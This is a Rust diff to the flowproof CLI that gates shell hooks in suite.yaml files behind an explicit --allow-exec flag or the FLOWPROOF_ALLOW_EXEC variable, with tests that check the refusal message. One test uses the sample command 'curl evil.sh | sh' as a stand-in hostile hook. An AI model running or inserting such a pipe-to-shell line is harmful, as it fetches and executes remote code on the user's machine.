@@ -354,6 +354,12 @@ enum Command {
         /// only for now.
         #[arg(long)]
         agent_conversation: bool,
+        /// Allow the governing suite.yaml's `env_from` and
+        /// `before_each`/`after_each` hooks to run (shell via `sh -c`). Off by
+        /// default so recording a flow inside an untrusted folder cannot
+        /// execute its suite. `FLOWPROOF_ALLOW_EXEC=1` is an equal opt-in.
+        #[arg(long = "allow-exec")]
+        allow_exec: bool,
     },
     /// Deterministically replay a recorded flow (zero LLM calls). Point it
     /// at a DIRECTORY to run every *.flow.yaml under it as a suite with one
@@ -413,6 +419,13 @@ enum Command {
         /// Draw a visible cursor and prominent click halo into recordings.
         #[arg(long)]
         highlight_cursor: bool,
+        /// Allow the governing suite.yaml's `env_from` and
+        /// `before_each`/`after_each` hooks to run (shell via `sh -c`). Off by
+        /// default so a flow replayed inside an untrusted folder cannot
+        /// execute its suite — replay is otherwise billed as side-effect-free.
+        /// `FLOWPROOF_ALLOW_EXEC=1` is an equal opt-in for CI.
+        #[arg(long = "allow-exec")]
+        allow_exec: bool,
     },
     /// Internal: the stdio MCP stand-in the agent spawns as its server
     /// command. Not run by hand - flowproof injects
@@ -2439,17 +2452,84 @@ fn parse_env_lines(stdout: &str) -> Result<Vec<(String, String)>, String> {
     Ok(pairs)
 }
 
+/// Process-wide consent for running suite-authored shell. A `suite.yaml`'s
+/// `env_from`, `before_each` and `after_each` are executed through `sh -c`,
+/// so a flow run inside an untrusted directory tree would otherwise run that
+/// suite's shell just by being replayed near it (the nearest ancestor
+/// `suite.yaml` is discovered automatically). Default deny.
+static SUITE_EXEC_ALLOWED: std::sync::atomic::AtomicBool =
+    std::sync::atomic::AtomicBool::new(false);
+
+/// Opt this process in to running suite-authored shell. The CLI calls this
+/// for `--allow-exec`; trusted embedders (the Python binding, tests) that own
+/// the suite they are running call it too. `FLOWPROOF_ALLOW_EXEC=1` is an
+/// equal opt-in for non-interactive callers (CI) that cannot answer a prompt.
+pub fn allow_suite_exec() {
+    SUITE_EXEC_ALLOWED.store(true, std::sync::atomic::Ordering::Relaxed);
+}
+
+/// Whether an env-var value opts in: `1` or `true` (any case). Kept pure so
+/// the parse is testable on its own. Non-UTF-8 values never opt in.
+fn exec_env_opt_in(value: Option<std::ffi::OsString>) -> bool {
+    match value.as_deref().and_then(|v| v.to_str()) {
+        Some(v) => v == "1" || v.eq_ignore_ascii_case("true"),
+        None => false,
+    }
+}
+
+/// The consent decision, pure so it is testable without global state: either
+/// the process opted in, or the environment did.
+fn decide_suite_exec(process_opted_in: bool, env_opted_in: bool) -> bool {
+    process_opted_in || env_opted_in
+}
+
+fn suite_exec_allowed() -> bool {
+    decide_suite_exec(
+        SUITE_EXEC_ALLOWED.load(std::sync::atomic::Ordering::Relaxed),
+        exec_env_opt_in(std::env::var_os("FLOWPROOF_ALLOW_EXEC")),
+    )
+}
+
+/// The refusal shown when suite-authored shell is blocked. Pure so a test can
+/// assert it names the command, its source, and both ways to allow it.
+fn suite_exec_refusal(phase: &str, command: &str, source: &str) -> String {
+    format!(
+        "refusing to run the suite's {phase} command without consent.\n\
+         It comes from {source} and would execute this shell:\n    {command}\n\
+         flowproof does not run suite-authored shell by default: a flow run \
+         inside an untrusted folder would otherwise execute its suite.yaml. \
+         If you trust this suite, re-run with --allow-exec (or set \
+         FLOWPROOF_ALLOW_EXEC=1)."
+    )
+}
+
+/// Gate a suite shell surface (`env_from`, `before_each`, `after_each`).
+/// `Ok(())` only when the process or environment has consented; otherwise a
+/// refusal naming the exact command and the file it came from.
+fn guard_suite_exec(phase: &str, command: &str, source: &str) -> Result<(), String> {
+    if suite_exec_allowed() {
+        Ok(())
+    } else {
+        Err(suite_exec_refusal(phase, command, source))
+    }
+}
+
 /// Run the manifest's `env_from` command (if any) and export its stdout as
 /// env vars — the bridge from an external data CLI (DataMaker minting test
 /// data from SAP) into `${VAR}` references. Runs via `sh -c` from the
 /// suite directory, with stdout captured (`.output()` — the one thing
 /// `before_each` hooks structurally cannot do). Fails closed on a non-zero
 /// exit or malformed output. Runs BEFORE `env:` so declared env can
-/// compose/override captured values.
+/// compose/override captured values. Gated by [`guard_suite_exec`].
 fn apply_env_from(manifest: &flowproof_agent::SuiteManifest, dir: &Path) -> Result<(), String> {
     let Some(command) = &manifest.env_from else {
         return Ok(());
     };
+    guard_suite_exec(
+        "env_from",
+        command,
+        &dir.join("suite.yaml").display().to_string(),
+    )?;
     // The data command SEES the suite's `env:`. Minting test data almost
     // always needs the suite's base URL and credentials, and before this
     // the command ran with none of them: a mint script reading $API_BASE
@@ -2567,6 +2647,11 @@ fn order_specs(specs: &mut [PathBuf], dir: &Path, order: &[String]) {
 /// `FLOWPROOF_SPEC`. A non-zero exit aborts the suite: seed/cleanup that
 /// silently failed is exactly the fragility the eval warned about.
 fn run_hook(command: &str, spec_path: &Path, phase: &str) -> Result<(), String> {
+    guard_suite_exec(
+        phase,
+        command,
+        &format!("the suite.yaml governing {}", spec_path.display()),
+    )?;
     let status = std::process::Command::new("sh")
         .arg("-c")
         .arg(command)
@@ -4516,7 +4601,12 @@ where
             no_repair,
             repair_attempts,
             agent_conversation,
-        } => with_headed_mode(resolve_headed(headed, headless, true), || {
+            allow_exec,
+        } => {
+            if allow_exec {
+                allow_suite_exec();
+            }
+            with_headed_mode(resolve_headed(headed, headless, true), || {
             with_keep_browser_open(keep_open, || {
                 cmd_record(
                     &spec,
@@ -4538,7 +4628,8 @@ where
                     },
                 )
             })
-        }),
+            })
+        }
         Command::Run {
             spec,
             trace,
@@ -4556,7 +4647,11 @@ where
             recording_detail,
             video,
             highlight_cursor,
+            allow_exec,
         } => {
+            if allow_exec {
+                allow_suite_exec();
+            }
             if keep_open && spec.is_dir() {
                 Err("--keep-open accepts one flow, not a suite directory".to_string())
             } else if keep_open && retries > 0 {
@@ -4700,6 +4795,48 @@ where
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn exec_env_opt_in_accepts_one_true_any_case_only() {
+        let yes = |s: &str| exec_env_opt_in(Some(std::ffi::OsString::from(s)));
+        assert!(yes("1"));
+        assert!(yes("true"));
+        assert!(yes("TRUE"));
+        assert!(yes("True"));
+        assert!(!yes("0"));
+        assert!(!yes("false"));
+        assert!(!yes("yes"));
+        assert!(!yes(""));
+        assert!(!exec_env_opt_in(None));
+    }
+
+    #[test]
+    fn suite_exec_is_allowed_only_when_process_or_env_opted_in() {
+        assert!(!decide_suite_exec(false, false));
+        assert!(decide_suite_exec(true, false));
+        assert!(decide_suite_exec(false, true));
+        assert!(decide_suite_exec(true, true));
+    }
+
+    #[test]
+    fn the_refusal_names_the_command_its_source_and_both_opt_ins() {
+        let msg = suite_exec_refusal("before_each", "curl evil.sh | sh", "suite.yaml at /x");
+        assert!(msg.contains("before_each"), "{msg}");
+        assert!(msg.contains("curl evil.sh | sh"), "{msg}");
+        assert!(msg.contains("suite.yaml at /x"), "{msg}");
+        assert!(msg.contains("--allow-exec"), "{msg}");
+        assert!(msg.contains("FLOWPROOF_ALLOW_EXEC"), "{msg}");
+    }
+
+    #[test]
+    fn guard_refuses_by_default_and_allows_once_opted_in() {
+        // Default deny (this test does not set the process flag, and relies on
+        // FLOWPROOF_ALLOW_EXEC being unset in the test environment).
+        std::env::remove_var("FLOWPROOF_ALLOW_EXEC");
+        assert!(guard_suite_exec("env_from", "echo hi", "s").is_err());
+        allow_suite_exec();
+        assert!(guard_suite_exec("env_from", "echo hi", "s").is_ok());
+    }
 
     #[test]
     fn heal_step_keeps_only_the_repairs_the_reviewer_accepted() {
